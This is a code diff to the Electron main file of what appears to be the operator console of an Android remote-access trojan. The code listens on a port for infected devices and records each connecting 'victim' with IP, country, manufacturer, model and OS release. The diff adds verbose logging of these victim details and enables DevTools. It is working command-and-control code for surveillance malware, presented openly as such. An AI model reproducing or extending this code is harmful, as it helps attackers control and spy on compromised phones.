@@ -13,12 +13,8 @@ const IOs = {};
 //--------------------------------------------------------------
 
 function createWindow() {
-
-
-  // get Display Sizes ( x , y , width , height)
+  // get Display Sizes
   display = electron.screen.getPrimaryDisplay();
-
-
 
   //------------------------SPLASH SCREEN INIT------------------------------------
   // create the splash window
@@ -37,28 +33,23 @@ function createWindow() {
     fullscreen: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true,
+      enableRemoteModule: true
     }
   });
-
 
   // load splash file
   splashWin.loadFile(__dirname + '/app/splash.html');
 
   splashWin.webContents.on('did-finish-load', function () {
-    splashWin.show(); //close splash
+    splashWin.show();
   });
-
 
   // Emitted when the window is closed.
   splashWin.on('closed', () => {
-    // Dereference the window object
     splashWin = null
   })
 
-
   //------------------------Main SCREEN INIT------------------------------------
-  // Create the browser window.
   win = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.png',
     width: 900,
@@ -77,27 +68,21 @@ function createWindow() {
   });
 
   win.loadFile(__dirname + '/app/index.html');
-  //open dev tools
-  //win.webContents.openDevTools()
 
-  // Emitted when the window is closed.
+  // Open DevTools
+  win.webContents.openDevTools();
+
   win.on('closed', () => {
-    // Dereference the window object, usually you would store windows
-    // in an array if your app supports multi windows, this is the time
-    // when you should delete the corresponding element.
     win = null
   })
 
-  // Emitted when the window is finished loading.
   win.webContents.on('did-finish-load', function () {
     setTimeout(() => {
-      splashWin.close(); //close splash
-      win.show(); //show main
+      splashWin.close();
+      win.show();
     }, 2000);
   });
 }
-
-
 
 // This method will be called when Electron has finished
 // initialization and is ready to create browser windows.
@@ -121,12 +106,7 @@ app.on('activate', () => {
   }
 })
 
-
-
 //handle the Uncaught Exceptions
-
-
-
 
 const listeningStatus = {}; // Object to track listening status for each port
 
@@ -142,23 +122,36 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
   IOs[port].sockets.pingInterval = 10000;
   IOs[port].sockets.pingTimeout = 10000;
 
+  console.log(`[*] Socket.IO server listening on port ${port}`);
 
   IOs[port].sockets.on('connection', function (socket) {
+    console.log('[+] New connection from:', socket.request.connection.remoteAddress);
+    
     var address = socket.request.connection;
     var query = socket.handshake.query;
+    console.log('[*] Handshake query:', query);
+    
     var index = query.id;
     var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
+    console.log('[*] Client IP:', ip);
+    
     var country = null;
-    var geo = geoip.lookup(ip); // check ip location
-    if (geo)
+    var geo = geoip.lookup(ip);
+    if (geo) {
       country = geo.country.toLowerCase();
+      console.log('[*] Client country:', country);
+    }
 
-    // Add the victim to victimList
     victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+    console.log('[+] Added new victim:', {
+      ip: ip,
+      port: address.remotePort,
+      manufacturer: query.manf,
+      model: query.model,
+      release: query.release,
+      id: query.id
+    });
 
-
-    //------------------------Notification SCREEN INIT------------------------------------
-    // create the Notification window
     let notification = new BrowserWindow({
       frame: false,
       x: display.bounds.width - 280,
@@ -174,7 +167,6 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       }
     });
 
-    // Emitted when the window is finished loading.
     notification.webContents.on('did-finish-load', function () {
       notification.show();
       setTimeout(function () {
@@ -185,36 +177,20 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     notification.webContents.victim = victimsList.getVictim(index);
     notification.loadFile(__dirname + '/app/notification.html');
 
-
-
-    //notify renderer proccess (AppCtrl) about the new Victim
     win.webContents.send('SocketIO:NewVictim', index);
 
     socket.on('disconnect', function () {
-      // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
-
-      //notify renderer proccess (AppCtrl) about the disconnected Victim
       win.webContents.send('SocketIO:RemoveVictim', index);
-
       if (windows[index]) {
-        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-        //delete the window from windowsList
-        delete windows[index]
-      }
-
-      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
-      if (windows[index]) {
-        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
-        // delete the window from the winowsList
-        delete windows[index]
+        windows[index].close();
+        delete windows[index];
       }
     });
   });
 
-  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
-  listeningStatus[port] = true; // Update listening status for the specific port
+  listeningStatus[port] = true;
+  event.reply('SocketIO:Listen', '[√] Started Listening on Port: ' + port);
 });
 
 ipcMain.on('SocketIO:Stop', function (event, port) {
